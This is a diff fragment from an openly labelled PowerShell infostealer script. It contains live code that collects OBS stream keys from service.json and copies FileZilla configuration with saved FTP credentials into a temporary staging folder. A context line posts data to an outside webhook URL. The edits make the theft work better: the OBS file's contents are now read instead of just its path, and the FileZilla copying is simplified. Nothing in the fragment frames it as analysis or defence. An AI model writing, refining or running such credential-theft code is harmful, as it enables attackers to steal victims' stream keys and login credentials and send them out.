@@ -74,14 +74,13 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 # OBS Stream Key Steal
 $obs = Get-Childitem -Path $env:appdata\obs-studio\basic\profiles\ -Include service.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($obs -ne $null) {
-	Write-Output $obs >> $env:tmp/$FolderName/ObsData.json
+	Get-Content -Path $obs >> $env:tmp/$FolderName/ObsData.json
 }
 
 # FileZilla Data
 $filezilla = Get-Childitem -Path $env:appdata\FileZilla -Include filezilla.xml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($filezilla -ne $null) {
-	New-Item -Path $env:tmp/$FolderName/FileZilla -ItemType Directory
-	Copy-Item $env:appdata/FileZilla $env:tmp/$FolderName/FileZilla -Recurse
+	Copy-Item $env:appdata/FileZilla $env:tmp/$FolderName -Recurse
 }
 
 # RustDesk Config
